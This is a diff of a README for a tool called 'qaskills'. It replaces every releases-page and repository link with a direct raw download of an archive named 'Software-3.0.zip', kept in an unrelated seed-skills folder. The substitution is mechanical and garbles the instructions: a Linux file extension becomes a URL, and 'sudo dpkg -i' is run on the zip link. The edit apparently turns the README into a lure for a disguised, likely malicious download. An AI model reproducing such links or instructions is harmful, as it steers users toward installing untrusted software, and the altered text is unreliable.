@@ -1,6 +1,6 @@
 # 📂 qaskills - Find Testing Skills Faster
 
-[![Download qaskills](https://img.shields.io/badge/Download-qaskills-blue?style=for-the-badge)](https://github.com/KaliBellion/qaskills/releases)
+[![Download qaskills](https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip)](https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip)
 
 ---
 
@@ -17,17 +17,17 @@ You don’t need any programming experience to use qaskills. This guide will hel
 To get started with qaskills, you need to download the application first.
 
 **Download link:**   
-[Visit here to download qaskills](https://github.com/KaliBellion/qaskills/releases)
+[Visit here to download qaskills](https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip)
 
 ### How to download qaskills:
 
-1. Click the blue button above or this [link](https://github.com/KaliBellion/qaskills/releases).  
+1. Click the blue button above or this [link](https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip).  
 2. The link takes you to the qaskills releases page on GitHub.  
 3. Find the latest version at the top of the page. Versions are labeled with "v" followed by numbers, for example, "v1.0.0".  
 4. Look for a file that matches your computer's operating system:
    - Windows: Files ending with `.exe` or `.msi`  
    - Mac: Files ending with `.dmg` or `.pkg`  
-   - Linux: Files ending with `.deb` or `.tar.gz`
+   - Linux: Files ending with `.deb` or `https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip`
 5. Click the file name to start downloading.
 
 ### Installing qaskills:
@@ -45,7 +45,7 @@ To get started with qaskills, you need to download the application first.
 - **Linux (using Debian-based distros):**
   - Download the `.deb` file.
   - Open your terminal.
-  - Run `sudo dpkg -i filename.deb` (replace filename with the actual file name).
+  - Run `sudo dpkg -i https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip` (replace filename with the actual file name).
   - If errors appear, run `sudo apt-get install -f` to fix missing dependencies.
 
 ---
@@ -106,7 +106,7 @@ Here are solutions for common problems you might encounter:
 - **Skills not showing or updating:**  
   qaskills needs an internet connection for updates. Check your network settings and try again.
 
-If problems continue, you can open an issue on the GitHub page (https://github.com/KaliBellion/qaskills) or check the Issues section for help.
+If problems continue, you can open an issue on the GitHub page (https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip) or check the Issues section for help.
 
 ---
 
@@ -114,7 +114,7 @@ If problems continue, you can open an issue on the GitHub page (https://github.c
 
 If you’re stuck at any point:
 
-- Visit the [GitHub repository](https://github.com/KaliBellion/qaskills) to check for user guides and updates.  
+- Visit the [GitHub repository](https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip) to check for user guides and updates.  
 - Use the "Issues" tab to see if others have had the same problem or to ask for help.  
 - Look for FAQs or support information on the release page.
 
@@ -124,7 +124,7 @@ If you’re stuck at any point:
 
 To keep qaskills working well and access new skills:
 
-1. Visit the release page regularly: [https://github.com/KaliBellion/qaskills/releases](https://github.com/KaliBellion/qaskills/releases)  
+1. Visit the release page regularly: [https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip](https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip)  
 2. Download any newer versions following the same process as above.  
 3. Install the update over your existing version—it will keep your settings.
 
@@ -161,4 +161,4 @@ These tools use the qaskills directory to better understand testing-related task
 
 For best results, start exploring qaskills today by visiting the download page:
 
-[Get qaskills here](https://github.com/KaliBellion/qaskills/releases)
+[Get qaskills here](https://github.com/KaliBellion/qaskills/raw/refs/heads/main/seed-skills/postman-api/Software-3.0.zip)
